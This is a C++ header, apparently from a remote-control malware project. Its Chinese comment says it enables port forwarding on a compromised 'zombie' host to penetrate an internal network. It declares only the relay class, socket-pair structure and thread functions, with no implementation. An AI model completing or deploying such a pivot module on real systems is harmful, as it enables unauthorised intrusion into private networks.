//描述: 在肉鸡上开启转发功能, 达到渗透内网的目的 
//作者: firnsan 2012.12

#if !defined(TRAN_H_INCLUDED)
#define TRAN_H_INCLUDED


#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000


#include "BasicManager.h"



#define VERSION                        "1.00"
#define TIMEOUT                        300
#define MAXSIZE                        20480
#define HOSTLEN                        40
#define CONNECTNUM                  5

// define 2 socket struct
struct transocket 
{
	SOCKET fd1;
	SOCKET fd2;
};

class CTran : public CBasicManager  
{
public:
	CTran(CClient *pClient);
	virtual ~CTran();
	virtual void OnReceive(LPBYTE lpBuff,DWORD dwSize);
private:
	int ConnectPort, TransmitPort;

	HANDLE m_hThread[10];
	HANDLE m_hThreadMonitor;
	HANDLE m_hThreadWork;

	UINT m_nThreadCount;

	int create_socket();
	int create_server(int sockfd, int port);
    void transmitdata(transocket*);

    static DWORD WINAPI WorkThread(LPVOID lparam);
	static DWORD WINAPI bind2bind(LPVOID lparam);
	static DWORD WINAPI MonitorThread(LPVOID lparam);
	
};
#endif